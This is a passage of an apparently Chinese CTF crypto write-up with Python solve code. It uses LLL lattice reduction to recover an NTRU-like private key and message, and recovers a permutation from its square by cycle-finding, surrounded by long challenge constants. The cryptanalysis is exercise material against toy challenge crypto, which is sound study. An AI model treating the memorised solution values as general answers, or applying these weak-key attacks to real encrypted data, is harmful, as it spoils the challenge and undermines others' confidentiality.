class="number">177</span>, <span class="number">63</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">207</span>, <span class="number">153</span>, <span class="number">28</span>, <span class="number">132</span>, <span class="number">168</span>, <span class="number">84</span>, <span class="number">166</span>, <span class="number">171</span>, <span class="number">108</span>, <span class="number">21</span>, <span class="number">215</span>, <span class="number">164</span>, <span class="number">174</span>, <span class="number">121</span>, <span class="number">128</span>, <span class="number">91</span>, <span class="number">68</span>, <span class="number">20</span>, <span class="number">222</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">152</span>]</span><br><span class="line"></span><br><span class="line">pubkey(q,h):(<span class="number">18172777775303192159727657832771688633216215598877965158949208820296023901084764760222881725262986702478735713462424007788959106272018399708244805316198640706589775789778454299532286932532522325791791312289833643271330941006206604894333175027113622330874626579800679513666624938603337561309816936129926352661091319564303604867093095700819543458178063985869752612663625872468653351930763784372987474747809415652595112648835928004343413910248386752899307068129610089712815257479121368111201632430687614657790581254030567845143865728745079851692195657361359959987504557281840928862881924309178036648485188421874327022341</span>, <span class="number">392638098592460228418508462226385074690422702429214284385732305774317959159895775092251586043956914155602546821559652111400517952111932579557319610857122515237088379905875982863782386657213421074126519458271560586678974481499715849371311979995450766948182818105567819897007307737370051632369390705725712223883589110699340619034611462216676501782567065261228166297471411589579035544131060706331012337024260046692910523900152236991203944000276133732456285962825434272960749340504092014446362862600803570698206213069473248298100863523331832957430305801141935737006263947843411592717969844892834332104365594346376118846</span>)</span><br><span class="line">c=<span class="number">4605640253217003331334964510174592254013178259349707648547335080743845433538772185582533054930473399495034133342299169373655297635370654237814250924077096784419954824350471683280656146814012837777204413608581553756866045890045788846665715321962704221105416079118007959490372975054302058194463432668018727266982561600329852084442818715440190956213811944269576719501924787366260795121132011879061730892865163591549129768412164655406373350666250339077746317309673325358941772202710386313434421388779073207650619564862431076222163014501544922959835509589742031678624743915535537547452120771609556012990490607104696154771</span></span><br></pre></td></tr></table></figure><p>先看第二部分关于msg的还原 一个很经典的格<br>第一部分则是已知置换的平方还原置换 参考<a href="https://dexterjie.github.io/2023/11/29/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023ISCTF/#baby-group">https://dexterjie.github.io/2023/11/29/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023ISCTF/#baby-group</a></p><p>思路很惊艳 代码实现也很有难度 不愧只有2solves orz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">P2 = [<span class="number">82</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">200</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">4</span>, <span class="number">147</span>, <span class="number">171</span>, <span class="number">152</span>, <span class="number">193</span>, <span class="number">19</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">186</span>, <span class="number">8</span>, <span class="number">124</span>, <span class="number">159</span>, <span class="number">225</span>, <span class="number">6</span>, <span class="number">180</span>, <span class="number">125</span>, <span class="number">74</span>, <span class="number">14</span>, <span class="number">255</span>, <span class="number">60</span>, <span class="number">187</span>, <span class="number">132</span>, <span class="number">222</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">79</span>, <span class="number">57</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">72</span>, <span class="number">197</span>, <span class="number">201</span>, <span class="number">191</span>, <span class="number">75</span>, <span class="number">38</span>, <span class="number">135</span>, <span class="number">177</span>, <span class="number">165</span>, <span class="number">149</span>, <span class="number">17</span>, <span class="number">172</span>, <span class="number">173</span>, <span class="number">59</span>, <span class="number">210</span>, <span class="number">108</span>, <span class="number">31</span>, <span class="number">142</span>, <span class="number">163</span>, <span class="number">227</span>, <span class="number">178</span>, <span class="number">226</span>, <span class="number">73</span>, <span class="number">256</span>, <span class="number">190</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">238</span>, <span class="number">129</span>, <span class="number">157</span>, <span class="number">219</span>, <span class="number">131</span>, <span class="number">67</span>, <span class="number">28</span>, <span class="number">68</span>, <span class="number">236</span>, <span class="number">168</span>, <span class="number">209</span>, <span class="number">245</span>, <span class="number">93</span>, <span class="number">61</span>, <span class="number">122</span>, <span class="number">208</span>, <span class="number">137</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">111</span>, <span class="number">18</span>, <span class="number">161</span>, <span class="number">106</span>, <span class="number">54</span>, <span class="number">175</span>, <span class="number">70</span>, <span class="number">16</span>, <span class="number">110</span>, <span class="number">5</span>, <span class="number">218</span>, <span class="number">81</span>, <span class="number">233</span>, <span class="number">45</span>, <span class="number">91</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">104</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">228</span>, <span class="number">248</span>, <span class="number">150</span>, <span class="number">176</span>, <span class="number">167</span>, <span class="number">35</span>, <span class="number">130</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">42</span>, <span class="number">169</span>, <span class="number">232</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">205</span>, <span class="number">9</span>, <span class="number">235</span>, <span class="number">97</span>, <span class="number">84</span>, <span class="number">246</span>, <span class="number">36</span>, <span class="number">76</span>, <span class="number">240</span>, <span class="number">52</span>, <span class="number">144</span>, <span class="number">98</span>, <span class="number">86</span>, <span class="number">99</span>, <span class="number">21</span>, <span class="number">64</span>, <span class="number">217</span>, <span class="number">15</span>, <span class="number">202</span>, <span class="number">206</span>, <span class="number">55</span>, <span class="number">244</span>, <span class="number">65</span>, <span class="number">23</span>, <span class="number">53</span>, <span class="number">250</span>, <span class="number">78</span>, <span class="number">22</span>, <span class="number">215</span>, <span class="number">25</span>, <span class="number">66</span>, <span class="number">143</span>, <span class="number">107</span>, <span class="number">195</span>, <span class="number">80</span>, <span class="number">196</span>, <span class="number">254</span>, <span class="number">174</span>, <span class="number">33</span>, <span class="number">162</span>, <span class="number">252</span>, <span class="number">141</span>, <span class="number">153</span>, <span class="number">43</span>, <span class="number">185</span>, <span class="number">211</span>, <span class="number">220</span>, <span class="number">115</span>, <span class="number">127</span>, <span class="number">216</span>, <span class="number">251</span>, <span class="number">139</span>, <span class="number">95</span>, <span class="number">146</span>, <span class="number">48</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">199</span>, <span class="number">13</span>, <span class="number">160</span>, <span class="number">90</span>, <span class="number">223</span>, <span class="number">123</span>, <span class="number">181</span>, <span class="number">120</span>, <span class="number">164</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">128</span>, <span class="number">192</span>, <span class="number">249</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">207</span>, <span class="number">71</span>, <span class="number">182</span>, <span class="number">145</span>, <span class="number">62</span>, <span class="number">3</span>, <span class="number">92</span>, <span class="number">183</span>, <span class="number">194</span>, <span class="number">100</span>, <span class="number">24</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="number">117</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">140</span>, <span class="number">166</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">189</span>, <span class="number">63</span>, <span class="number">46</span>, <span class="number">58</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">47</span>, <span class="number">154</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">40</span>, <span class="number">26</span>, <span class="number">243</span>, <span class="number">253</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">105</span>, <span class="number">155</span>, <span class="number">138</span>, <span class="number">1</span>, <span class="number">212</span>, <span class="number">20</span>, <span class="number">203</span>, <span class="number">213</span>, <span class="number">198</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">109</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">221</span>, <span class="number">113</span>, <span class="number">96</span>, <span class="number">204</span>, <span class="number">7</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):</span><br><span class="line">    P2[i] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_Chain</span>(<span class="params">P2</span>):</span><br><span class="line">Chain = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):</span><br><span class="line">head = i</span><br><span class="line">chain = [head]</span><br><span class="line">c = P2[head]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):</span><br><span class="line">chain.append(c)</span><br><span class="line">c = P2[c]</span><br><span class="line"><span class="keyword">if</span> c == head:</span><br><span class="line"><span class="keyword">if</span> chain <span class="keyword">not</span> <span class="keyword">in</span> Chain:</span><br><span class="line">lag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Chain)):</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> chain:</span><br><span class="line"><span class="keyword">if</span> l <span class="keyword">in</span> Chain[k]:</span><br><span class="line">lag = <span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> lag == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(chain) == <span class="number">2</span>:</span><br><span class="line">Chain.append(chain[:-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">Chain.append(chain)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> Chain</span><br><span class="line"></span><br><span class="line">Chain = find_Chain(P2)</span><br><span class="line"><span class="built_in">print</span>(Chain)</span><br><span class="line">LEN = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> Chain:</span><br><span class="line">    LEN.append(<span class="built_in">len</span>(line))</span><br><span class="line"></span><br><span class="line">LEN = <span class="built_in">sorted</span>(LEN)[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(LEN)</span><br></pre></td></tr></table></figure><p>这样可以找到其中所有的环<br>再根据单环唯一确定 分裂出的双环有len种可能 嵌套循环枚举即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">P</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">int</span>:</span><br><span class="line">self.size = data</span><br><span class="line">self._<span class="built_in">list</span> = [i+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.size)]</span><br><span class="line">self._initialize()</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">list</span>:</span><br><span class="line">self._<span class="built_in">list</span> = data</span><br><span class="line">self.size = <span class="built_in">len</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, other</span>):</span><br><span class="line"><span class="keyword">return</span> P(self._iterList(self.getList(),other.getList()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">str</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">len</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, other</span>):</span><br><span class="line">tempList = self._<span class="built_in">list</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,other):</span><br><span class="line">tempList = self._iterList(tempList, tempList)</span><br><span class="line"><span class="keyword">return</span> P(tempList)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">str</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getList</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> self._<span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_initialize</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">random.shuffle(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_iterList</span>(<span class="params">self, List1,List2</span>):</span><br><span class="line">new_list = []</span><br><span class="line"><span class="keyword">for</span> elem <span class="keyword">in</span> List1:</span><br><span class="line">new_list.append(List2[elem - <span class="number">1</span>])</span><br><span class="line"><span class="keyword">return</span> new_list</span><br><span class="line">q,h = (<span class="number">18172777775303192159727657832771688633216215598877965158949208820296023901084764760222881725262986702478735713462424007788959106272018399708244805316198640706589775789778454299532286932532522325791791312289833643271330941006206604894333175027113622330874626579800679513666624938603337561309816936129926352661091319564303604867093095700819543458178063985869752612663625872468653351930763784372987474747809415652595112648835928004343413910248386752899307068129610089712815257479121368111201632430687614657790581254030567845143865728745079851692195657361359959987504557281840928862881924309178036648485188421874327022341</span>, <span class="number">392638098592460228418508462226385074690422702429214284385732305774317959159895775092251586043956914155602546821559652111400517952111932579557319610857122515237088379905875982863782386657213421074126519458271560586678974481499715849371311979995450766948182818105567819897007307737370051632369390705725712223883589110699340619034611462216676501782567065261228166297471411589579035544131060706331012337024260046692910523900152236991203944000276133732456285962825434272960749340504092014446362862600803570698206213069473248298100863523331832957430305801141935737006263947843411592717969844892834332104365594346376118846</span>)</span><br><span class="line">c=<span class="number">4605640253217003331334964510174592254013178259349707648547335080743845433538772185582533054930473399495034133342299169373655297635370654237814250924077096784419954824350471683280656146814012837777204413608581553756866045890045788846665715321962704221105416079118007959490372975054302058194463432668018727266982561600329852084442818715440190956213811944269576719501924787366260795121132011879061730892865163591549129768412164655406373350666250339077746317309673325358941772202710386313434421388779073207650619564862431076222163014501544922959835509589742031678624743915535537547452120771609556012990490607104696154771</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># M = Matrix(ZZ,2,2)</span></span><br><span class="line"><span class="comment"># M[0,0] = q</span></span><br><span class="line"><span class="comment"># M[0,1] = 0</span></span><br><span class="line"><span class="comment"># M[1,0] = h</span></span><br><span class="line"><span class="comment"># M[1,1] = 1</span></span><br><span class="line"><span class="comment"># Ge = M.LLL()</span></span><br><span class="line"><span class="comment"># for i in Ge:</span></span><br><span class="line"><span class="comment">#     g = int(abs(int(i[0])))</span></span><br><span class="line"><span class="comment">#     f = int(abs(int(i[-1])))</span></span><br><span class="line"><span class="comment">#     if f.bit_length()&gt;=1000:</span></span><br><span class="line"><span class="comment">#         print(f&#x27;g= &#123;g&#125;\nf= &#123;f&#125;&#x27;)</span></span><br><span class="line">g= <span class="number">80543133918404127488886301361326962793877182221425816412488158480855679387656522509067598512536004160200624450488501194899256437338964914229878803213278892167375927469338861409899138503409679804107844511855116009860285942703093653856978725198914922514759932610039646534971856735780113276875287001841258831367</span></span><br><span class="line">f= <span class="number">32114304664198200626949886557688567679378682689751764347873070091968817850723916157318846285817806084079915102989056457680818558130765168139779429885473027282918240513106424858891869095107110954431130817704525309921431164907347496920955065921260371828842317536589144089446549194267607829948059792467278739234</span></span><br><span class="line"></span><br><span class="line">mul=[<span class="number">114</span>, <span class="number">189</span>, <span class="number">92</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">161</span>, <span class="number">202</span>, <span class="number">250</span>, <span class="number">131</span>, <span class="number">9</span>, <span class="number">111</span>, <span class="number">226</span>, <span class="number">223</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">99</span>, <span class="number">208</span>, <span class="number">195</span>, <span class="number">216</span>, <span class="number">141</span>, <span class="number">116</span>, <span class="number">167</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">129</span>, <span class="number">15</span>, <span class="number">158</span>, <span class="number">178</span>, <span class="number">197</span>, <span class="number">4</span>, <span class="number">187</span>, <span class="number">27</span>, <span class="number">200</span>, <span class="number">144</span>, <span class="number">76</span>, <span class="number">74</span>, <span class="number">154</span>, <span class="number">86</span>, <span class="number">249</span>, <span class="number">93</span>, <span class="number">112</span>, <span class="number">46</span>, <span class="number">104</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">40</span>, <span class="number">225</span>, <span class="number">38</span>, <span class="number">98</span>, <span class="number">186</span>, <span class="number">169</span>, <span class="number">64</span>, <span class="number">118</span>, <span class="number">33</span>, <span class="number">88</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">183</span>, <span class="number">43</span>, <span class="number">201</span>, <span class="number">198</span>, <span class="number">242</span>, <span class="number">135</span>, <span class="number">110</span>, <span class="number">218</span>, <span class="number">244</span>, <span class="number">120</span>, <span class="number">83</span>, <span class="number">212</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">148</span>, <span class="number">142</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">232</span>, <span class="number">107</span>, <span class="number">18</span>, <span class="number">170</span>, <span class="number">60</span>, <span class="number">130</span>, <span class="number">247</span>, <span class="number">67</span>, <span class="number">65</span>, <span class="number">211</span>, <span class="number">182</span>, <span class="number">213</span>, <span class="number">134</span>, <span class="number">254</span>, <span class="number">70</span>, <span class="number">191</span>, <span class="number">210</span>, <span class="number">176</span>, <span class="number">145</span>, <span class="number">217</span>, <span class="number">82</span>, <span class="number">229</span>, <span class="number">125</span>, <span class="number">193</span>, <span class="number">155</span>, <span class="number">41</span>, <span class="number">113</span>, <span class="number">103</span>, <span class="number">49</span>, <span class="number">231</span>, <span class="number">133</span>, <span class="number">75</span>, <span class="number">109</span>, <span class="number">238</span>, <span class="number">126</span>, <span class="number">245</span>, <span class="number">163</span>, <span class="number">233</span>, <span class="number">227</span>, <span class="number">181</span>, <span class="number">51</span>, <span class="number">12</span>, <span class="number">143</span>, <span class="number">234</span>, <span class="number">239</span>, <span class="number">59</span>, <span class="number">240</span>, <span class="number">209</span>, <span class="number">42</span>, <span class="number">205</span>, <span class="number">230</span>, <span class="number">253</span>, <span class="number">203</span>, <span class="number">219</span>, <span class="number">23</span>, <span class="number">136</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">102</span>, <span class="number">94</span>, <span class="number">85</span>, <span class="number">62</span>, <span class="number">172</span>, <span class="number">236</span>, <span class="number">124</span>, <span class="number">100</span>, <span class="number">256</span>, <span class="number">196</span>, <span class="number">50</span>, <span class="number">101</span>, <span class="number">206</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">29</span>, <span class="number">61</span>, <span class="number">69</span>, <span class="number">246</span>, <span class="number">237</span>, <span class="number">16</span>, <span class="number">37</span>, <span class="number">184</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">22</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">190</span>, <span class="number">17</span>, <span class="number">55</span>, <span class="number">115</span>, <span class="number">251</span>, <span class="number">77</span>, <span class="number">214</span>, <span class="number">122</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">241</span>, <span class="number">224</span>, <span class="number">3</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">175</span>, <span class="number">194</span>, <span class="number">138</span>, <span class="number">179</span>, <span class="number">159</span>, <span class="number">160</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">73</span>, <span class="number">8</span>, <span class="number">35</span>, <span class="number">156</span>, <span class="number">117</span>, <span class="number">58</span>, <span class="number">140</span>, <span class="number">221</span>, <span class="number">180</span>, <span class="number">72</span>, <span class="number">123</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">228</span>, <span class="number">97</span>, <span class="number">71</span>, <span class="number">204</span>, <span class="number">39</span>, <span class="number">149</span>, <span class="number">2</span>, <span class="number">19</span>, <span class="number">173</span>, <span class="number">139</span>, <span class="number">146</span>, <span class="number">54</span>, <span class="number">96</span>, <span class="number">220</span>, <span class="number">79</span>, <span class="number">66</span>, <span class="number">57</span>, <span class="number">127</span>, <span class="number">243</span>, <span class="number">188</span>, <span class="number">165</span>, <span class="number">47</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">7</span>, <span class="number">199</span>, <span class="number">30</span>, <span class="number">177</span>, <span class="number">63</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">207</span>, <span class="number">153</span>, <span class="number">28</span>, <span class="number">132</span>, <span class="number">168</span>, <span class="number">84</span>, <span class="number">166</span>, <span class="number">171</span>, <span class="number">108</span>, <span class="number">21</span>, <span class="number">215</span>, <span class="number">164</span>, <span class="number">174</span>, <span class="number">121</span>, <span class="number">128</span>, <span class="number">91</span>, <span class="number">68</span>, <span class="number">20</span>, <span class="number">222</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">152</span>]</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = ((c*f)%q)*modinv(f,g)%g</span><br><span class="line">msg = m%g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P2 = [<span class="number">82</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">200</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">4</span>, <span class="number">147</span>, <span class="number">171</span>, <span class="number">152</span>, <span class="number">193</span>, <span class="number">19</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">186</span>, <span class="number">8</span>, <span class="number">124</span>, <span class="number">159</span>, <span class="number">225</span>, <span class="number">6</span>, <span class="number">180</span>, <span class="number">125</span>, <span class="number">74</span>, <span class="number">14</span>, <span class="number">255</span>, <span class="number">60</span>, <span class="number">187</span>, <span class="number">132</span>, <span class="number">222</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">79</span>, <span class="number">57</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">72</span>, <span class="number">197</span>, <span class="number">201</span>, <span class="number">191</span>, <span class="number">75</span>, <span class="number">38</span>, <span class="number">135</span>, <span class="number">177</span>, <span class="number">165</span>, <span class="number">149</span>, <span class="number">17</span>, <span class="number">172</span>, <span class="number">173</span>, <span class="number">59</span>, <span class="number">210</span>, <span class="number">108</span>, <span class="number">31</span>, <span class="number">142</span>, <span class="number">163</span>, <span class="number">227</span>, <span class="number">178</span>, <span class="number">226</span>, <span class="number">73</span>, <span class="number">256</span>, <span class="number">190</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">238</span>, <span class="number">129</span>, <span class="number">157</span>, <span class="number">219</span>, <span class="number">131</span>, <span class="number">67</span>, <span class="number">28</span>, <span class="number">68</span>, <span class="number">236</span>, <span class="number">168</span>, <span class="number">209</span>, <span class="number">245</span>, <span class="number">93</span>, <span class="number">61</span>, <span class="number">122</span>, <span class="number">208</span>, <span class="number">137</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">111</span>, <span class="number">18</span>, <span class="number">161</span>, <span class="number">106</span>, <span class="number">54</span>, <span class="number">175</span>, <span class="number">70</span>, <span class="number">16</span>, <span class="number">110</span>, <span class="number">5</span>, <span class="number">218</span>, <span class="number">81</span>, <span class="number">233</span>, <span class="number">45</span>, <span class="number">91</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">104</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">228</span>, <span class="number">248</span>, <span class="number">150</span>, <span class="number">176</span>, <span class="number">167</span>, <span class="number">35</span>, <span class="number">130</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">42</span>, <span class="number">169</span>, <span class="number">232</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">205</span>, <span class="number">9</span>, <span class="number">235</span>, <span class="number">97</span>, <span class="number">84</span>, <span 